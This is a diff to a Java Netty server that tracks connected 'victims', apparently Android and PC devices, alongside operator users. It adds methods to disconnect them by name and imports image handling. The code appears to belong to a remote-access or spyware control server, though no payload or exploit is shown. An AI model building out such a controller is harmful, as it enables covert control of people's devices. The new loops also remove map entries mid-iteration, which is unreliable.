@@ -1,3 +1,4 @@
+import client.PCVictimDevice;
 import db.DBManager;
 import decoders.RequestDecoder;
 import encoders.ResponseEncoder;
@@ -7,6 +8,9 @@ import io.netty.channel.nio.NioEventLoopGroup;
 import io.netty.channel.socket.SocketChannel;
 import io.netty.channel.socket.nio.NioServerSocketChannel;
 
+import javax.imageio.ImageIO;
+import java.io.File;
+import java.io.IOException;
 import java.sql.SQLException;
 import java.util.HashMap;
 import java.util.Map;
@@ -115,7 +119,7 @@ public class NettyServer {
         System.out.println("Пользователи:");
         for (Map.Entry<ChannelId, User> entry : users.entrySet()) {
             User user = entry.getValue();
-            System.out.println(user.getName() + " aVictims: " + user.getVictims() + " id: " + entry.getKey());
+            System.out.println(user.getName() + " victims: " + user.getVictims() + " id: " + entry.getKey());
         }
     }
 
@@ -208,6 +212,36 @@ public class NettyServer {
             if (entry.getValue().getName().equals(name)) return entry.getValue();
         }
         return null;
+    }
+
+    void disconnectUsersByName(String name) {
+        for (Map.Entry<ChannelId, User> entry : users.entrySet()) {
+            User user = entry.getValue();
+            if (user.getName().equals(name)) {
+                user.disconnect();
+                users.remove(entry.getKey());
+            }
+        }
+    }
+
+    void disconnectAVictimsByName(String name) {
+        for (Map.Entry<ChannelId, AVictim> entry : aVictims.entrySet()) {
+            AVictim aVictim = entry.getValue();
+            if (aVictim.getName().equals(name)) {
+                aVictim.disconnect();
+                aVictims.remove(entry.getKey());
+            }
+        }
+    }
+
+    void disconnectPCVictimsByName(String name) {
+        for (Map.Entry<ChannelId, PCVictim> entry : pcVictims.entrySet()) {
+            PCVictim pcVictim = entry.getValue();
+            if (pcVictim.getName().equals(name)) {
+                pcVictim.disconnect();
+                pcVictims.remove(entry.getKey());
+            }
+        }
     }
 
     public static void main(String[] args) {
